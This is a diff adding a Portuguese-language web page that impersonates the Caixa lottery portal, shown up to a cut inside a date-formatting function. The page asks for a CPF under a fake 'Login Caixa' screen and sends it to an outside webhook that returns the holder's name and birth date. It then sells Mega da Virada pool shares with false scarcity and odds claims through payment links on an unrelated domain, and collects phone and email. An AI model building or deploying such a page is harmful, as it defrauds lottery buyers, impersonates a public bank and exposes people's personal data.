@@ -1,0 +1,1276 @@
+<!doctype html>
+<html lang="pt-br">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loterias Online</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+<script>
+  window.pixelId = "691d04186a5058a487db3c88";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <style>
+        @font-face {
+            font-family: 'Futura-Book';
+            src: url('font/Futura-Book.eot');
+            src: url('font/Futura-Book﹖.eot') format('embedded-opentype'),
+                url('font/Futura-Book.woff2') format('woff2'),
+                url('font/Futura-Book.woff') format('woff'),
+                url('font/Futura-Book.ttf') format('truetype'),
+                url('font/Futura-Book.svg') format('svg');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        body {
+            font-family: 'Futura-Book' !important;
+        }
+
+        /* Sistema de Passos */
+        .passo {
+            display: none;
+        }
+
+        .passo.ativo {
+            display: block;
+        }
+
+        /* ===== ESTILOS DO PASSO 1 ===== */
+        #passo1 body {
+            background: linear-gradient(45deg, #00a9ad, #005ca9); 
+            background-size: 100%;
+            background-repeat: no-repeat;
+            height: 100vh !important;
+            overflow: hidden !important;
+        }
+
+        #passo1 .container-principal {
+            height: 100vh;
+        }
+
+        #passo1 .container-principal img {
+            width: 100px;
+        }
+
+        #passo1 .container-principal h1 {
+            color: white;
+            font-size: 1.5rem;
+            margin-top: 3rem;
+        }
+
+        #passo1 .botoes {
+            margin-top: .5rem;
+        }
+
+        #passo1 .botoes a {
+            width: 8rem;
+            margin: 0rem .7rem;
+        }
+
+        #passo1 .botoes button {
+            background-color: #f39200;
+            color: white;
+            font-weight: 500;
+            width: 100%;
+            border: none;
+            padding: .5rem .5rem .2rem .5rem;
+            font-size: 1.2rem;
+            border-radius: .4rem;
+            cursor: pointer;
+        }
+
+        #passo1 .botoes button:hover {
+            background-color: #173e68;
+            color: white;
+        }
+
+        #passo1 button.btn-nao {
+            background-color: white;
+            color: #173e68;
+        }
+
+        /* ===== ESTILOS DO PASSO 2 ===== */
+        #passo2 .container-bg {
+            background: linear-gradient(45deg, #00a9ad, #005ca9); 
+            background-size: 100%;
+            background-repeat: no-repeat;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #passo2 .container-principal {
+            height: auto;
+            margin: 0 auto;
+            background-color: white;
+            width: 450px;
+            max-width: 95%;
+            color: black;
+            background-color: #fff !important;
+            border-radius: .4rem;
+            box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
+            padding: 3rem 4rem;
+        }
+
+        @media (max-width: 576px) {
+            #passo2 .container-principal {
+                padding: 3rem 2rem !important;
+            } 
+        }
+
+        #passo2 .container-principal img {
+            width: 150px;
+        }
+
+        #passo2 .container-principal h1 {
+            color: #0070ae;
+            font-size: 1rem;
+            margin-top: .4rem;
+        }
+
+        #passo2 .container-principal h2 {
+            color: #4d7880;
+            font-size: 1.1rem;
+            margin-top: 1rem;
+            margin-bottom: 2.2rem;
+            width: 100%;
+            text-align: justify;
+        }
+
+        #passo2 .container-principal h3 {
+            color: #0070ae;
+            font-size: 1rem;
+            margin-top: .6rem;
+        }
+
+        #passo2 .container-principal h3 a{
+            color: #0070ae;
+            font-weight: 600;
+        }
+
+        #passo2 .container-principal form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        #passo2 .container-principal .form-group {
+            position: relative;
+            width: 100%;
+            margin-bottom: 1.5rem;
+        }
+
+        #passo2 .container-principal form label {
+            position: absolute;
+            top: 11%;
+            left: 0;
+            transform: translateY(-11%);
+            color: #4d7880;
+            font-size: 1rem;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        #passo2 .container-principal form input {
+            font-size: 1rem;
+            margin: 0 !important;
+            padding: 0 !important;
+            height: 40px;
+            width: 100%;
+            border: none;
+            border-bottom: 1.3px orange solid !important;
+            padding-left: 5px;
+            color: #4d7880;
+        }
+
+        #passo2 .container-principal form input:focus {
+            outline: 0px !important;
+        }
+
+        #passo2 .botoes {
+            margin-top: 2rem;
+        }
+
+        #passo2 button.botoes  {
+            margin-top: 1.5rem;
+            background-color: #f39200;
+            color: white;
+            font-weight: 500;
+            width: 100%;
+            border: none;
+            padding: .5rem 1rem;
+            font-size: 1rem;
+            border-radius: .2rem;
+            margin-bottom: .4rem;
+            cursor: pointer;
+        }
+
+        #passo2 button.botoes:hover {
+            background-color: #173e68;
+            color: white;
+        }
+
+        /* ===== ESTILOS DO PASSO 3 ===== */
+        #passo3 .container-bg {
+            background: linear-gradient(45deg, #00a9ad, #005ca9); 
+            background-size: 100%;
+            background-repeat: no-repeat;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #passo3 .container-principal {
+            height: auto;
+            margin: 0 auto;
+            background-color: white;
+            width: 450px;
+            max-width: 95%;
+            color: black;
+            background-color: #fff !important;
+            border-radius: .4rem;
+            box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
+            padding: 3rem 4rem;
+        }
+
+        @media (max-width: 576px) {
+            #passo3 .container-principal {
+                padding: 3rem 2rem !important;
+            } 
+        }
+
+        #passo3 .container-principal img {
+            width: 150px;
+        }
+
+        #passo3 .container-principal h1 {
+            color: #0070ae;
+            font-size: 1rem;
+            margin-top: .4rem;
+        }
+
+        #passo3 .container-principal h2 {
+            color: #4d7880;
+            font-size: 1.1rem;
+            margin-top: 1rem;
+            margin-bottom: .5rem;
+            width: 100%;
+            text-align: justify;
+        }
+
+        #passo3 .container-principal h3 {
+            color: #0070ae;
+            font-size: 1rem;
+            margin-top: 1.1rem;
+        }
+
+        #passo3 .container-principal h3 a{
+            color: #0070ae;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        #passo3 .container-principal form {
+            width: 100%;
+            display: flex;
+            justify-content: start;
+            color: #4d7880;
+            font-size: 1.1rem;
+            margin-top: .4rem;
+        }
+
+        #passo3 .container-principal form label {
+            margin-left: .4rem;
+        }
+
+        #passo3 .botoes {
+            margin-top: 1rem;
+        }
+
+        #passo3 .botoes a {
+            width: 100%;
+        }
+
+        #passo3 .botoes button  {
+            background-color: #f39200;
+            color: white;
+            font-weight: 500;
+            width: 100%;
+            border: none;
+            padding: .5rem 1rem;
+            font-size: 1rem;
+            border-radius: .2rem;
+            margin-bottom: .6rem;
+            cursor: pointer;
+        }
+
+        #passo3 .botoes button:hover {
+            background-color: #173e68;
+        }
+
+        #passo3 button.btn-nao {
+            background-color: transparent !important;
+            border: solid 2px #f39200;
+            color: #f39200;
+        }
+
+        /* ===== ESTILOS DO PASSO 4 ===== */
+        #passo4 .topo {
+            background-image: url('img/bg-top.jpeg');
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+        
+        #passo4 .topo-fix {
+            background-color: #005da8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: .5rem 0rem;
+        }
+
+        #passo4 .topo-fix img {
+            width: 45px;
+            text-align: center;
+        }
+
+        #passo4 .image-lateral img {
+            width: 100%;
+        }
+
+        #passo4 .topo-cont {
+            padding: 2rem 1rem;
+        }
+
+        #passo4 .topo-fonts h1 {
+            font-size: 1.8rem;
+            color: white;
+        }
+
+        #passo4 .topo-fonts h2 {
+            font-size: 1rem;
+            color: white;
+        }
+
+        #passo4 .topo-fonts {
+            justify-content: center;
+            align-items: start;
+        }
+
+        @media (max-width: 576px) {
+            #passo4 .topo-fonts h1 {
+                text-align: center;
+            }
+
+            #passo4 .topo-fonts h2 {
+                text-align: center;
+            }
+
+            #passo4 .topo-fonts {
+                justify-content: center;
+                align-items: center;
+            }
+        }
+
+        #passo4 .container-bg {
+            background: linear-gradient(45deg, #00a9ad, #005ca9); 
+            background-size: 100%;
+            background-repeat: no-repeat;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem 1rem;
+        }
+
+        #passo4 .container-bg h1 {
+            font-size: 1.4rem;
+            color: white;
+            margin-bottom: 1rem;
+        }
+
+        #passo4 .container-principal {
+            height: auto;
+            margin: 0 auto;
+            margin-bottom: 1.6rem;
+            background-color: white;
+            width: 450px;
+            max-width: 100%;
+            color: black;
+            background-color: #fff !important;
+            border-radius: .4rem;
+            box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
+            padding: 0rem 0rem;
+        }
+
+        #passo4 .container-destaque {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: auto;
+            margin: 0 auto;
+            margin-bottom: 2rem;
+            margin-top: 1.2rem;
+            background-color: #f39200;
+            width: 450px;
+            max-width: 100%;
+            color: black;
+            border-radius: .4rem;
+            padding: 1.4rem 1rem 0rem 1rem;
+        }
+
+        #passo4 .container-destaque span {
+            margin-top: -2.3rem;
+            margin-bottom: 1rem;
+            background-color: black;
+            padding: .3rem 1.3rem .2rem 1.3rem;
+            border-radius: .2rem;
+            font-size: .9rem;
+            color: white;
+        }
+
+        @media (max-width: 576px) {
+            #passo4 .container-principal {
+                padding: 0rem 0rem !important;
+            } 
+        }
+
+        #passo4 .container-principal img {
+            width: 100%;
+        }
+
+        #passo4 .topo-container {
+            background-color: #65a86b;
+            width: 100%;
+            padding: .4rem 0rem;
+            border-radius: .4rem .4rem 0rem 0rem;
+        }
+
+        #passo4 .topo-container img {
+            width: 23px;
+        }
+
+        #passo4 .topo-container h1 {
+            color: white !important;
+            font-size: 1.2rem !important;
+            margin: 0px;
+            margin-left: .4rem !important;
+        }
+
+        #passo4 .container-principal-p {
+            padding: 1rem .4rem;
+        }
+
+        #passo4 .container-principal b {
+            color: black;
+        }
+
+        #passo4 .container-principal h1 {
+            color: #0070ae;
+            font-size: 1.5rem;
+            margin: .4rem 0rem;
+            text-align: center;
+        }
+
+        #passo4 .container-principal h2 {
+            color: #4d7880;
+            font-size: 1.1rem;
+            margin: .4rem 0rem;
+            width: 100%;
+            text-align: center;
+        }
+
+        #passo4 .container-principal h3 {
+            color: #0070ae;
+            font-size: 1.3rem;
+            line-height: 1em;
+            margin: .4rem 0rem;
+            text-align: center;
+            line-height: 1.8rem;
+        }
+
+        #passo4 .line {
+            width: 100%;
+            margin: .8rem 0rem;
+            border-bottom: dashed #bebebe 1px;
+        }
+
+        #passo4 .dezenas {
+            width: 100%;
+            display: flex;
+            flex-wrap: wrap; 
+            justify-content: center; 
+            align-items: center; 
+            margin: 1rem 0;
+            gap: 0.2rem;
+        }
+
+        #passo4 .dezenas span {
+            flex: 1 1 calc(14% - 1rem);
+            max-width: 30px;
+            height: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #0070ae;
+            padding: 0.2rem 0rem 0rem 0rem;
+            border-radius: 50%;
+            color: white;
+            font-size: 0.9rem;
+            margin: 0;
+            line-height: 1;
+        }
+
+        #passo4 .botoes {
+            margin: 0 auto;
+            width: 90%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 1.3rem;
+        }
+
+        #passo4 .botoes a {
+            width: 100%;
+        }
+
+        #passo4 .botoes button {
+            background-color: #f39200;
+            color: white;
+            font-weight: 500;
+            width: 100%;
+            border: none;
+            padding: .5rem 1rem;
+            font-size: 1rem;
+            border-radius: .2rem;
+            margin-bottom: .6rem;
+            cursor: pointer;
+        }
+
+        #passo4 .botoes button:hover {
+            background-color: #173e68;
+        }
+
+        #passo4 button.btn-nao {
+            background-color: transparent !important;
+            border: solid 2px grey;
+            color: grey;
+        }
+
+        /* Estilos do Modal */
+        .modal {
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .modal-content h2 {
+            margin: 0 0 10px;
+            color: #0070ae;
+            font-size: 1.5rem;
+        }
+
+        .modal-content p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #4d7880;
+        }
+
+        /* Estilos para o formulário do modal */
+        .modal-content form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .modal-content .form-group-modal {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            text-align: left;
+        }
+
+        .modal-content .form-group-modal label {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+
+        .modal-content .form-group-modal input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+
+        .modal-content .form-group-modal input:focus {
+            outline: none;
+            border-color: #0070ae;
+        }
+
+        .modal-content .form-group-modal input:read-only {
+            background-color: #f5f5f5;
+            cursor: not-allowed;
+        }
+
+        .modal-content button[type="submit"] {
+            background-color: #f39200;
+            color: white;
+            padding: 14px 24px;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            border: none;
+            margin-top: 10px;
+        }
+
+        .modal-content button[type="submit"]:hover {
+            background-color: #173e68;
+            transform: translateY(-2px);
+        }
+
+        .modal-content button[type="submit"]:active {
+            transform: translateY(1px);
+        }
+
+        .modal-content button[type="submit"]:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 28px;
+            color: #aaa;
+            cursor: pointer;
+            font-weight: bold;
+            line-height: 1;
+        }
+
+        .modal-close:hover {
+            color: #000;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- ============================================ -->
+<!-- PASSO 1: Verificação de Idade -->
+<!-- ============================================ -->
+<div id="passo1" class="passo ativo" style="background: linear-gradient(45deg, #00a9ad, #005ca9); background-size: 100%; background-repeat: no-repeat; height: 100vh; overflow: hidden;">
+    <div class="container-principal d-flex justify-content-center align-items-center flex-column">
+        <img src="img/loterias-caixa-logo.webp" alt="">
+        <h1>Você tem mais de 18 anos?</h1>
+        <div class="botoes w-100 d-flex justify-content-center align-items-center">
+            <a href="javascript:void(0);" onclick="irParaPasso(2)"><button>SIM</button></a>
+            <a href="javascript:void(0);" onclick="alert('Você precisa ter mais de 18 anos para continuar.')"><button class="btn-nao">NÃO</button></a>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================ -->
+<!-- PASSO 2: Login com CPF -->
+<!-- ============================================ -->
+<div id="passo2" class="passo">
+    <div class="container-bg">
+        <div class="container-principal d-flex justify-content-center align-items-center flex-column">
+            <img src="img/logo-caixa.webp" alt="">
+            <h1>Login Caixa</h1>
+            <h2>Informe seu CPF e clique em "Próximo" para continuar:</h2>
+            <form id="cpfForm">
+                <div class="form-group">
+                    <label for="cpf">CPF</label>
+                    <input name="cpf" id="cpf" type="text" onkeyup="formatCpf(this)" maxlength="14">
+                    <button class="botoes" type="submit">Próximo</button>
+                </div>
+            </form>
+            
+            <h3>É novo por aqui? <a href="javascript:void(0);">Cadastre-se</a></h3>
+            <h3><a href="javascript:void(0);">Preciso de ajuda</a></h3>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================ -->
+<!-- PASSO 3: Confirmação de Nome -->
+<!-- ============================================ -->
+<div id="passo3" class="passo">
+    <div class="container-bg">
+        <div class="container-principal d-flex justify-content-center align-items-center flex-column">
+            <img src="img/logo-caixa.webp" alt="">
+            <h1>Login Caixa</h1>
+            <h2>Para continuar, confirme se o seu nome está corrreto.</h2>
+            <h2>Nome:</h2>
+            <form>
+                <input type="radio" checked> 
+                <label id="nome_usuario"></label><br>
+            </form>  
+            
+            <div class="botoes w-100 d-flex flex-column justify-content-center align-items-center">
+                <a href="javascript:void(0);" onclick="irParaPasso(4)"><button>Sim, sou eu</button></a>
+                <a href="javascript:void(0);" onclick="irParaPasso(2)"><button class="btn-nao">Quero alterar meus dados</button></a>
+            </div>
+
+            <h3><a href="javascript:void(0);">Preciso de ajuda</a></h3>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================ -->
+<!-- PASSO 4: Bolões/Produtos -->
+<!-- ============================================ -->
+<div id="passo4" class="passo">
+    <div class="w-100 topo">
+        <div class="w-100 topo-fix">
+            <img src="img/icon-caixa.webp" alt="">
+        </div>
+        <div class="container">
+            <div class="row topo-cont">
+                <div class="topo-fonts col-md-6 d-flex flex-column">
+                    <h1>Loterias Online da Caixa</h1>
+                    <h2>Portal Loterias CAIXA: agora você pode apostar na sorte de onde estiver.</h2>
+                </div>
+                <div class="image-lateral col-md-6 d-flex flex-column justify-content-center align-items-center">
+                    <img src="img/image-lateral.png" alt="">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-bg">
+        <h1>Bolões disponíveis:</h1>
+
+        <!-- Bolão 1 -->
+        <div class="container-principal d-flex flex-column justify-content-center align-items-center flex-column">
+            <div class="topo-container d-flex justify-content-center align-items-center">
+                <img src="img/icon-loterias.webp" alt="">
+                <h1>Mega da Virada</h1>
+            </div>
+            <div class="container-principal-p">
+                <h1>R$ 850.000.000,00</h1>
+                <h2>Bolão Especial</h2>
+                <div class="line"></div>
+                <h2>Sorteio: <b>31/12/2025</b></h2>
+                <h2>Composição: <b>1 Bolão com 15 Dezenas</b></h2>
+                <div class="line"></div>
+                <div class="dezenas">
+                    <span>01</span>
+                    <span>03</span>
+                    <span>06</span>
+                    <span>12</span>
+                    <span>15</span>
+                    <span>17</span>
+                    <span>20</span>
+                    <span>22</span>
+                    <span>27</span>
+                    <span>32</span>
+                    <span>31</span>
+                    <span>34</span>
+                </div>
+                <div class="line"></div>
+                <h3>Sua chance de ganhar aumenta em 37x (vezes)!</h3>
+                <div class="line"></div>
+                <h2>Disponíveis: <b>09 Cotas</b></h2>
+                <h2>Valor da Cota: <b>R$49,90</b></h2>
+                <div class="botoes">
+                    <button onclick="window.location.href='https://pay.fanalizeeaqui.shop/RmA83Eaz6dz3PVp'"><i class="bi bi-cart-fill"></i> GARANTIR BOLÃO</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bolão 2 -->
+        <div class="container-principal d-flex flex-column justify-content-center align-items-center flex-column">
+            <div class="topo-container d-flex justify-content-center align-items-center">
+                <img src="img/icon-loterias.webp" alt="">
+                <h1>Mega da Virada</h1>
+            </div>
+            <div class="container-principal-p">
+                <h1>R$ 850.000.000,00</h1>
+                <h2>Bolão Especial</h2>
+                <div class="line"></div>
+                <h2>Sorteio: <b>31/12/2025</b></h2>
+                <h2>Composição: <b>1 Bolão com 18 Dezenas</b></h2>
+                <div class="line"></div>
+                <div class="dezenas">
+                    <span>01</span>
+                    <span>05</span>
+                    <span>08</span>
+                    <span>13</span>
+                    <span>15</span>
+                    <span>18</span>
+                    <span>25</span>
+                    <span>26</span>
+                    <span>29</span>
+                    <span>31</span>
+                    <span>33</span>
+                    <span>37</span>
+                    <span>38</span>
+                    <span>41</span>
+                    <span>42</span>
+                </div>
+                <div class="line"></div>
+                <h3>Sua chance de ganhar aumenta em 173x (vezes)!</h3>
+                <div class="line"></div>
+                <h2>Disponíveis: <b>07 Cotas</b></h2>
+                <h2>Valor da Cota: <b>R$79,90</b></h2>
+                <div class="botoes">
+                    <button onclick="window.location.href='https://pay.fanalizeeaqui.shop/2wq7Gr7rJyDgBAN'"><i class="bi bi-cart-fill"></i> GARANTIR BOLÃO</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Bolão 3 (Mais Vendido) -->
+        <div class="container-destaque">
+            <span>MAIS VENDIDO</span>
+            <div class="container-principal d-flex flex-column justify-content-center align-items-center flex-column">
+                <div class="topo-container d-flex justify-content-center align-items-center">
+                    <img src="img/icon-loterias.webp" alt="">
+                    <h1>Mega da Virada</h1>
+                </div>
+                <div class="container-principal-p">
+                    <h1>R$ 850.000.000,00</h1>
+                    <h2>Bolão Especial</h2>
+                    <div class="line"></div>
+                    <h2>Sorteio: <b>31/12/2025</b></h2>
+                    <h2>Composição: <b>1 Bolão com 20 Dezenas</b></h2>
+                    <div class="line"></div>
+                    <div class="dezenas">
+                        <span>01</span>
+                        <span>05</span>
+                        <span>07</span>
+                        <span>11</span>
+                        <span>17</span>
+                        <span>19</span>
+                        <span>20</span>
+                        <span>22</span>
+                        <span>27</span>
+                        <span>32</span>
+                        <span>33</span>
+                        <span>36</span>
+                        <span>37</span>
+                        <span>41</span>
+                        <span>42</span>
+                        <span>48</span>
+                        <span>49</span>
+                        <span>52</span>
+                        <span>58</span>
+                        <span>59</span>
+                    </div>
+                    <div class="line"></div>
+                    <h3>Sua chance de ganhar aumenta em 1.327x (vezes)!</h3>
+                    <div class="line"></div>
+                    <h2>Disponíveis: <b>01 Cota</b></h2>
+                    <h2>Valor da Cota: <b>R$99,90</b></h2>
+                    <div class="botoes">
+                        <button onclick="window.location.href='https://pay.fanalizeeaqui.shop/2wq7Gr7rJzjgBAN'" style="background-color: #0070ae;"><i class="bi bi-cart-fill"></i> GARANTIR BOLÃO</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Bolão 4 (Esgotado) -->
+        <div class="container-principal d-flex flex-column justify-content-center align-items-center flex-column">
+            <div class="topo-container d-flex justify-content-center align-items-center">
+                <img src="img/icon-loterias.webp" alt="">
+                <h1>Mega da Virada</h1>
+            </div>
+            <div class="container-principal-p">
+                <h1>R$ 850.000.000,00</h1>
+                <h2>Bolão Especial</h2>
+                <div class="line"></div>
+                <h2>Sorteio: <b>31/12/2025</b></h2>
+                <h2>Composição: <b>1 Bolão com 20 Dezenas</b></h2>
+                <div class="line"></div>
+                <div class="dezenas">
+                    <span>01</span>
+                    <span>03</span>
+                    <span>04</span>
+                    <span>18</span>
+                    <span>16</span>
+                    <span>17</span>
+                    <span>21</span>
+                    <span>23</span>
+                    <span>24</span>
+                    <span>30</span>
+                    <span>33</span>
+                    <span>36</span>
+                    <span>37</span>
+                    <span>41</span>
+                    <span>43</span>
+                    <span>45</span>
+                    <span>49</span>
+                    <span>52</span>
+                    <span>54</span>
+                    <span>56</span>
+                </div>
+                <div class="line"></div>
+                <h3>Sua chance de ganhar aumenta em 1327x (vezes)!</h3>
+                <div class="line"></div>
+                <h2>Disponíveis: <b>00 Cotas</b></h2>
+                <h2>Valor da Cota: <b>R$109,90</b></h2>
+                <div class="botoes">
+                    <button class="btn-nao"><i class="bi bi-cart-fill"></i> ESGOTADO</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Modal com formulário de dados do usuário -->
+    <div id="userDataModal" class="modal" style="display:none;">
+        <div class="modal-content">
+            <span class="modal-close" id="closeUserModal">&times;</span>
+            <h2>Complete seus dados</h2>
+            <p>Preencha as informações abaixo para finalizar sua compra:</p>
+            
+            <form id="userDataForm">
+                <div class="form-group-modal">
+                    <label for="userName">Nome Completo:</label>
+                    <input type="text" id="userName" name="userName" required readonly>
+                </div>
+                
+                <div class="form-group-modal">
+                    <label for="userBirthDate">Data de Nascimento:</label>
+                    <input type="date" id="userBirthDate" name="userBirthDate" required>
+                </div>
+                
+                <div class="form-group-modal">
+                    <label for="userPhone">Telefone:</label>
+                    <input type="tel" id="userPhone" name="userPhone" placeholder="(00) 00000-0000" required>
+                </div>
+                
+                <div class="form-group-modal">
+                    <label for="userEmail">E-mail:</label>
+                    <input type="email" id="userEmail" name="userEmail" placeholder="seu@email.com" required>
+                </div>
+                
+                <button type="submit">FINALIZAR COMPRA</button>
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================ -->
+<!-- SCRIPTS -->
+<!-- ============================================ -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
+
+<script type="text/javascript">
+// ===== SISTEMA DE NAVEGAÇÃO ENTRE PASSOS =====
+let passoAtual = 1;
+
+function irParaPasso(numeroPasso) {
+    // Esconde o passo atual
+    document.getElementById('passo' + passoAtual).classList.remove('ativo');
+    
+    // Mostra o novo passo
+    document.getElementById('passo' + numeroPasso).classList.add('ativo');
+    
+    // Atualiza o passo atual
+    passoAtual = numeroPasso;
+    
+    // Scroll para o topo
+    window.scrollTo(0, 0);
+
+    // Se for o passo 3, carrega o nome do localStorage
+    if (numeroPasso === 3) {
+        const nomeCpf = localStorage.getItem('nome_cpf');
+        if (nomeCpf) {
+            $('#nome_usuario').text(nomeCpf);
+        } else {
+            $('#nome_usuario').text('Nome não encontrado');
+        }
+    }
+}
+
+// ===== PASSO 2: FORMATAÇÃO E CONSULTA DE CPF =====
+window.addEventListener('load', function () {
+    document.getElementById('cpf').value = '';
+});
+
+function formatCpf(input) {
+    let value = input.value.replace(/\D/g, ''); 
+    if (value.length > 3) value = value.replace(/^(\d{3})(\d)/, '$1.$2'); 
+    if (value.length > 6) value = value.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3'); 
+    if (value.length > 9) value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4'); 
+    input.value = value;
+}
+
+document.getElementById('cpfForm').addEventListener('submit', function (event) {
+    event.preventDefault();
+
+    localStorage.removeItem('nome_cpf');
+    localStorage.removeItem('data_nasc');
+
+    const cpfInput = document.getElementById('cpf');
+    const cpf = cpfInput.value.replace(/\D/g, '');
+    const button = this.querySelector('button[type="submit"]');
+
+    button.disabled = true;
+    button.textContent = 'Consultando...';
+    button.style.opacity = '0.5';
+
+    if (cpf.length !== 11) {
+        alert("CPF inválido!");
+        button.disabled = false;
+        button.textContent = 'Próximo';
+        button.style.opacity = '1';
+        return;
+    }
+
+    const url = `https://fluxos.kodexpert.com.br/webhook/e3358323-f6eb-42e5-8a54-7513d794b2c4/kodexpert/cpf/${cpf}`;
+
+    $.ajax({
+        url: url,
+        method: 'GET',
+        dataType: 'json',
+        success: function (data) {
+            if (data && typeof data === "object" && data.NOME) {
+                localStorage.setItem('nome_cpf', data.NOME);
+                if (data.NASC) {
+                    localStorage.setItem('data_nasc', data.NASC);
+                }
+
+                const delay = 2000;
+                setTimeout(function () {
+                    button.disabled = false;
+                    button.textContent = 'Próximo';
+                    button.style.opacity = '1';
+                    irParaPasso(3);
+                }, delay);
+            } else {
+                alert('Erro: Dados não encontrados para este CPF');
+                button.disabled = false;
+                button.textContent = 'Próximo';
+                button.style.opacity = '1';
+            }
+        },
+        error: function (jqXHR, textStatus, errorThrown) {
+            if (jqXHR.responseText) {
+                console.log('Resposta do servidor (texto bruto):', jqXHR.responseText);
+            }
+            alert('Erro na requisição: ' + textStatus + '. Detalhes: ' + errorThrown);
+            button.disabled = false;
+            button.textContent = 'Próximo';
+            button.style.opacity = '1';
+        }
+    });
+});
+
+// Animação do Label no Passo 2
+document.addEventListener('DOMContentLoaded', function() {
+    const input = document.getElementById('cpf');
+    const label = input.previousElementSibling; 
+
+    function moveLabel() {
+        if (input.value.trim() !== '') {
+            label.style.top = '-15px';
+        } else {
+            label.style.top = '11%';
+        }
+    }
+
+    input.addEventListener('focus', function() {
+        label.style.top = '-15px';
+    });
+
+    input.addEventListener('blur', moveLabel);
+    input.addEventListener('input', moveLabel);
+
+    moveLabel();
+});
+
+// ===== PASSO 4: SISTEMA DE MODAL E PAGAMENTO =====
+let currentAmount = '';
+let currentBolao = '';
+
+// Função para capturar parâmetros UTM da URL
+function getUrlParams() {
+    const params = new URLSearchParams(window.location.search);
+    return {
+        utm_source: params.get('utm_source') || 'organic',
+        utm_campaign: params.get('utm_campaign') || '',
+        utm_medium: params.get('utm_medium') || '',
+        utm_content: params.get('utm_content') || '',
+        utm_term: params.get('utm_term') || '',
+        xcod: params.get('xcod') || 'organichQwK21wXxRhQwK21wXxRhQwK21wXxRhQwK21wXxR'
+    };
+}
+
+// Função para formatar telefone automaticamente
+function formatPhone(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 10) {
+        value = value.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
+    } else if (value.length > 5) {
+        value = value.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, '($1) $2-$3');
+    } else if (value.length > 2) {
+        value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
+    } else {
+        value = value.replace(/^(\d*)/, '($1');
+    }
+    input.value = value;
+}
+
+
+function formatarDataParaInput(data) {
+    // Se a data vier no formato dd/mm/yyyy
+    if (data.includes('/')) {
+        const partes = data.split('/');
